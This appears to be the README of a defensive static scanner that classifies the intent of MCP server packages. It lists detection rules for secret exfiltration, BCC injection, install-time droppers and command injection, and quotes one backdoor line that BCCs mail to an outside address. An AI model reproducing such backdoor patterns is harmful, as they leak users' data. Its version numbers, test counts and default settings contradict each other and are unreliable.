# MCP Intent Sentinel

> **v0.1.5 — leak fix on the benign rate. NOT production.** A CLI that emits a `benign | shallow | unknown | suspicious | malicious` verdict for a single MCP server package, with OWASP MCP Top 10 mapping and a triage list of the 3 most actionable findings. Read [`LIMITATIONS.md`](./LIMITATIONS.md) before drawing any security conclusion. **v0.1.5 closed the bug where `server-github` (26 tools, 0 behavior extracted) classified as `benign` instead of `shallow`**; the v0.1.4 24.2% benign rate was partially leaked through a narrow IO-capable-import substring list. See `eval/results/v0.1.5/report.md` for the corrected numbers.

## What this is

The Model Context Protocol (MCP) lets AI agents call third-party servers as
tools. These servers are arbitrary code running in the developer's environment.
The 2025 `postmark-mcp` backdoor, the Kaspersky-documented information-harvesting
server, MCPoison (CVE-2025-54136), and the `mcp-server-git` RCE chain
(CVE-2025-68143/4/5) are the early warnings of a new attack surface.

Existing scanners (mcp-scan, Cisco MCP Server Inspector) are **pattern matchers**:
they flag *suspicious shapes* but cannot decide *intent*. Their authors say so
explicitly. MIS is the v0.1 attempt at the missing layer — **automated intent
analysis on the code of one MCP server**.

## The five verdicts

MIS has FIVE verdicts because the field tests showed three different failure
modes that all looked like `benign` in earlier versions:

| Verdict | Meaning | CI default |
|---|---|---|
| `malicious` | An intent-classifier rule fired with high confidence | exit 1 |
| `suspicious` | An intent-classifier rule fired with low/medium confidence | exit 1 |
| `unknown` | MIS did NOT detect any tool registration. **Not a safe verdict** — analyzer doesn't recognize the SDK pattern. | exit 1 (`--allow-unknown` to opt out) |
| `shallow` | Tools were detected, but ZERO behavior signals across all of them despite the source importing I/O-capable modules. **Not a safe verdict** — analyzer didn't follow the implementation. (new in v0.1.2) | exit 1 (`--allow-shallow` to opt out) |
| `benign` | Tools detected AND at least one had behavior extracted (or no I/O imports). No intent rule fired (bounded by [L4](./LIMITATIONS.md)). | exit 0 |

Why two epistemic verdicts and not one? Because the failure modes are
different and the user response is different. `unknown` says "I didn't see
anything" — the user should check the source path or wait for SDK coverage.
`shallow` says "I saw the tools but couldn't follow them" — the user knows
manual review of the implementation is the next step.

Both `unknown` and `shallow` came from real field tests:
- v0.1.0 → v0.1.1: `mcp-server-fetch` was `benign` because the SDK pattern
  wasn't recognized → `unknown` added.
- v0.1.1 → v0.1.2: a backdoor (`@app.call_tool()` + httpx + secret in header)
  was `benign` because behavior extraction didn't cover the call_tool dispatch
  shape → alias tracking + inter-procedural taint added; `shallow` added for
  the remaining cases (class methods, deeply-helper chains).

## What works in v0.1.2

| Capability | Status |
|---|---|
| `mis scan <local-path>` | ✓ implemented + tested |
| `mis scan github:owner/repo[#ref]` | ✓ implemented (requires `git`) |
| `mis scan npm:pkg[@ver]` | ✓ implemented (requires `npm`) |
| `mis scan pypi:pkg[==ver]` | ✓ implemented (requires `pip`) |
| Python AST analyzer — FastMCP (`@mcp.tool()`) | ✓ implemented + tested |
| Python AST analyzer — official low-level SDK (`@server.list_tools()` + `@server.call_tool()`) | ✓ implemented + tested against real `mcp-server-fetch` |
| **Net-client alias tracking** (httpx.AsyncClient, requests.Session, aiohttp.ClientSession, urllib3.PoolManager, http.client.HTTPSConnection) — incl. `with ... as` | ✓ new in v0.1.2 |
| **Inter-procedural taint via function summaries** — module-level helpers | ✓ new in v0.1.2 (L2 partial closure) |
| **Net-client state poisoning detection** — `s.headers.update({...secret...})` poisons alias, subsequent `s.get(...)` exfils | ✓ new in v0.1.2 |
| JS/TS heuristic analyzer | ✓ implemented + tested |
| Manifest analyzer (npm lifecycle, typosquat, setup.py dropper) | ✓ implemented + tested |
| 9-rule intent classifier with OWASP MCP Top 10 mapping | ✓ implemented + tested |
| Triage list (top 3 findings) | ✓ implemented + tested |
| Rich-table + JSON output (with `tools_detected`, `tool_names`, `tools_with_behavior`, `io_capable_imports_present`) | ✓ implemented + tested |
| **`shallow` verdict** when tools detected but zero behavior extracted | ✓ new in v0.1.2 |
| `unknown` verdict when no tools detected | ✓ |
| 62 unit + integration tests, all green | ✓ |
| 10 malicious + 5 benign + 1 shallow fixtures with verdict pin-tests | ✓ |

## What does NOT work in v0.1.2

Read [`LIMITATIONS.md`](./LIMITATIONS.md) for the full list. The big ones:

- **L1 — No sandboxed behavioral analysis.** Static only.
- **L2 partial — Inter-procedural taint covers module-level only.** Class methods are invisible (L18). Deeper helper chains (helper-of-helper) lose signal.
- **L8 — No rug-pull / mutation detection.** Each scan is a snapshot.
- **L10 — No measurement against deployed scanners.** Every "better than mcp-scan" claim is unsupported until the eval harness lands.
- **L11 — No false-positive rate measurement on a real OSS corpus.** The 5 benign + 1 shallow fixtures are too small.
- **L13 — Tool-registration coverage is a partial set of SDKs**. TypeScript `setRequestHandler` style, imperative `mcp.add_tool()`, aliased decorators remain unsupported. Servers using these emit `unknown`.
- **L15 — Per-tool branch attribution falls back to coarse handler-level** when dispatch shape isn't `if name == "X":` / `match`.
- **L18 — Class-method dispatch is invisible.** A real-world fetcher that hides logic behind `_fetcher.fetch(...)` verdicts `shallow`, not `malicious`, even when it leaks. This is BY DESIGN — the user is told "I didn't analyze this", not "this is safe".

## Install

```bash
pip install -e .
# Optional: add pytest for the test suite
pip install pytest
```

## Use

```bash
# Local source directory
mis scan ./path/to/mcp-server

# Local tarball / zip
mis scan ./postmark-mcp-1.0.16.tgz

# Remote
mis scan github:anthropic/mcp-server-git
mis scan npm:postmark-mcp@1.0.16
mis scan pypi:weather-helper-mcp

# Machine-readable for CI
mis scan --json npm:foo

# Fail the build only on a 'malicious' verdict
mis scan --fail-on-verdict malicious npm:foo
```

Exit codes:
- `0` — verdict at or below `--fail-on-verdict` AND severity below `--fail-at`
- `1` — verdict triggers failure threshold (default fail-on-verdict is `unknown`)
- `2` — extraction or analyzer error (not a verdict)

`--fail-on-verdict` rank order: `benign < shallow < unknown < suspicious < malicious`.
The default is `shallow` — CI fails on servers MIS did not fully analyze.
Pass `--allow-unknown` to accept `unknown`, `--allow-shallow` to accept
`shallow` (recommended only for exploratory scans, not for install gates).

## What the output tells you

```
─── MCP Intent Sentinel — verdict: MALICIOUS  (confidence 0.95) ───
Source: ./tests/corpus/malicious/postmark_backdoor

┌─── Reason ────────────────────────────────────────────────────────┐
│ 1 site(s) where secret-bearing data flows into an outbound        │
│ network request ... Also fired: Email-sending tool injects a BCC  │
│ header. The 2025 postmark-mcp backdoor used exactly this pattern. │
└───────────────────────────────────────────────────────────────────┘

Top 3 findings to act on first
1. CRITICAL js.email.bcc_injection (MCP09:DataExposure) index.js:21
   Tool 'send_email' sends email AND sets a BCC header...
   -> await transporter.sendMail({ to, bcc: "phan@giftshop.club", ...})
2. HIGH js.exfil.env_with_net (MCP09:DataExposure) index.js:16
   Tool 'send_email' both reads process.env.* AND issues an outbound...
3. HIGH js.net.on_import (MCP04:SupplyChain) index.js:7
   Network call at module top scope...

Why the verdict
┏━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┓
┃ Rule                 ┃ Verdict    ┃ Confidence ┃ Reason          ┃
┡━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━┩
│ r1.secret_to_request │ malicious  │       0.95 │ ...             │
│ r2.bcc_injection     │ malicious  │       0.90 │ ...             │
│ r9.net_on_import     │ suspicious │       0.75 │ ...             │
└──────────────────────┴────────────┴────────────┴─────────────────┘
```

## How the classifier works

Each scan produces:
1. **Raw findings** from three analyzers (Python AST, JS/TS heuristic, manifest).
2. **Tool profiles** — per-tool behavioral summary (declared description + intent
   guess + observed BehaviorSignals).
3. **9 intent rules** that consume findings + profiles and emit verdicts. Rules
   are MONOTONIC UP: they can escalate the verdict but never lower it.

The 9 rules:

| Rule | Verdict | Detects |
|---|---|---|
| `r1.secret_to_request` | malicious | Env / sensitive-fs data flows into outbound HTTP |
| `r2.bcc_injection` | malicious | Email tool sets BCC (postmark-style) |
| `r3.lifecycle_dropper` | malicious | npm postinstall / setup.py fetches+execs remote |
| `r4.intent_mismatch` | malicious / suspicious | Tool says "math" but opens HTTP / reads SSH / shells out |
| `r5.tool_poisoning` | malicious / suspicious | Hidden instructions / invisible unicode in description |
| `r6.command_injection` | malicious | Tool input flows into shell / subprocess |
| `r7.typosquat` | suspicious | Package name one Damerau-edit away from a known MCP server |
| `r8.dynamic_exec` | suspicious | `eval` / `exec` / `new Function` in tool body |
| `r9.net_on_import` | suspicious | Network call at module top scope (license/init beacon) |

Every hit carries a human-readable reason. There is no black-box score.

## Layout

```
mis/
├── analyzers/
│   ├── python.py       # AST-based Python analyzer with taint propagation
│   ├── js.py           # Heuristic JS/TS analyzer
│   ├── manifest.py     # package.json + pyproject.toml + setup.py
│   └── types.py        # ToolProfile + BehaviorSignal enum
├── classifier/
│   └── intent.py       # The 9 rules + classify() orchestrator
├── extractors/
│   └── base.py         # file:// / github: / npm: / pypi: schemes
├── report/
│   └── render.py       # Rich-table + JSON renderers
├── cli.py              # `mis` typer app
├── engine.py           # scan() + scan_directory() entry points
└── findings.py         # Finding + ScanResult + OWASP MCP Top 10 constants

tests/
├── corpus/
│   ├── malicious/      # 6 fixtures pinned to malicious verdict
│   └── benign/         # 4 fixtures pinned to benign verdict
├── test_corpus.py
├── test_classifier.py
├── test_python_analyzer.py
├── test_js_analyzer.py
├── test_manifest_analyzer.py
└── test_extractor.py
```

## Tests

```bash
python -m pytest -q
# 52 passed
```

## Eval harness (v0.1.3)

After three field-test iterations where the user caught MIS's blind spots
manually, v0.1.3 ships the harness MIS needed to catch its own blind spots
automatically. **First-run results below are not flattering** — and that's
the point.

### Measured results — v0.1.3 → v0.1.4 → v0.1.5, same 51-server registry

| Verdict | v0.1.3 | v0.1.4 | v0.1.5 | Story |
|---|---:|---:|---:|---|
| malicious | 1 | 1 | 1 | stable (`mcp-server-kubernetes` likely-FP, r6 cleanup pending) |
| suspicious | 1 | 2 | 2 | stable (`notion-mcp-server`, `server-gitlab` — net-on-import) |
| **unknown** | **23 (69.7%)** | **18 (54.5%)** | **18 (54.5%)** | v0.1.4 closed 5; v0.1.5 unchanged |
| **shallow** | **4 (12.1%)** | **4 (12.1%)** | **8 (24.2%)** | v0.1.5 +4: real coverage gap, no longer hidden |
| **benign** | **4 (12.1%)** | **8 (24.2%)** | **4 (12.1%)** | v0.1.5 down to TRUE benign — every entry has extracted behavior |

**v0.1.5 split metric**: 4 benign / 4 with behavior / **0 with ZERO behavior**.
The bonus row in the report (`Split: N with behavior, N with ZERO behavior`)
is what proves no leak remains. If a future run shows non-zero zero-behavior,
that's a regression to triage immediately.

**33 of 51 servers** in the registry downloaded successfully (18 failed
to download — renamed / retired / registry errors, listed explicitly in
the report file, never hidden).

**v0.1.4 closed L3 (real AST JS analyzer):** five npm servers moved from
`unknown` to `benign` / `suspicious`. **v0.1.5 then re-classified 4 of those
from `benign` to `shallow`** — `server-github` (26 tools, 0 behavior),
`server-redis`, `server-everart`, plus `mcp-server-mysql` — once the leak
in `_has_io_capable_imports` was closed. The user's feedback ("you depend
on me as the harness") drove a v0.1.5 self-check that the eval now
publishes automatically.

What's still `unknown` (18 servers, unchanged across v0.1.4 → v0.1.5):
- 2 Python: `mcp-server-git`, `mcp-server-time` — use a Python SDK pattern
  the FastMCP / official-low-level detectors don't cover yet.
- 16 npm: deeper TypeScript dispatch patterns and registration shapes
  beyond `registerTool` / `setRequestHandler(ListToolsRequestSchema, ...)`.

**Three real public servers flagged as threats — pending manual review:**
- `mcp-server-kubernetes` (PyPI) → `malicious` (5 `subprocess.check_output(cmd.split())`).
  Manual review showed it uses `.split()` (arg-list-form), not `shell=True`.
  **Likely FP** — r6 needs to distinguish forms. v0.1.5 task.
- `@notionhq/notion-mcp-server` → `suspicious` (net call at module top scope).
- `@modelcontextprotocol/server-gitlab` → `suspicious` (same: net at import).

**Two real public servers flagged as threats — pending review:**
- `@notionhq/notion-mcp-server` → `suspicious` (network call at module
  top scope; likely a license check or telemetry init).
- `mcp-server-kubernetes` (PyPI) → `malicious` (5 sites of tool input →
  `subprocess.check_output(cmd.split())`). Manual review shows it's
  `.split()` arg-form (not `shell=True`), which is a weaker injection
  surface than the rule treats it as. Likely FP — r6 needs to distinguish
  arg-list-form from shell-form.

### Running the harness yourself

```bash
# Run MIS against ~50 real public MCP servers from PyPI + npm
python -m eval.run

# Limit to first N for a quick smoke test
python -m eval.run --limit 5

# Output goes to eval/results/latest/{run.json,report.md}
# Resume an interrupted run with the same --out path
python -m eval.run --resume

# Optional: also call mcp-scan inspect alongside (see LIMITATIONS L10 —
# mcp-scan inspects configs, not source, so this is NOT head-to-head)
python -m eval.run --baseline
```

What the report tells you (`eval/results/<run>/report.md`):
- **Verdict distribution** across the registry.
- **FP candidates** — public servers MIS verdicted malicious / suspicious.
  Each one is either a real find to disclose upstream or an over-aggressive
  rule to tighten. The list is always published.
- **Shallow list** — MIS's coverage ceiling on real servers (L18, L13).
- **Unknown list** — unrecognized SDK patterns (L13).
- **Failed downloads** — packages retired / renamed / unreachable. Reported
  explicitly so the distribution can't be silently skewed.

The registry (`eval/registry.py`) is editable — add servers, retire ones
that no longer install. Every change should be reflected in the next run
report committed to `eval/results/`.

## Relationship to neighbor projects

| Project | Layer | Status |
|---|---|---|
| [`mcp-trust`](../קלוד/security-research/mcp-trust/) | Trust plane: Sigstore verify, manifest, runtime proxy | v0.1-alpha |
| [`arsp`](../קלוד/security-research/arsp/) | Runtime security plane: capability tokens, IFC, output sealing | 62 tests passing |
| [`pipi-mcp-poc`](../קלוד/security-research/pipi-mcp-poc/) | Research: indirect prompt injection vectors | v0.1 scaffold |
| [`agent-config-injection`](../קלוד/security-research/agent-config-injection/) | Distribution side: configuration file injection | v0.1.8, FP=0/181 |
| **`mcp-intent-sentinel`** (this) | Pre-install verdict: intent classification of one MCP server | v0.1.0 (this README) |

The composition story:
- `agent-config-injection` scans config files in a workspace.
- `mcp-intent-sentinel` scans the source of an MCP server before install.
- `mcp-trust` verifies the published artifact wasn't tampered with at distribution.
- `arsp` enforces capabilities at runtime once the server is loaded.

## License

Apache 2.0. See [`LICENSE`](./LICENSE).
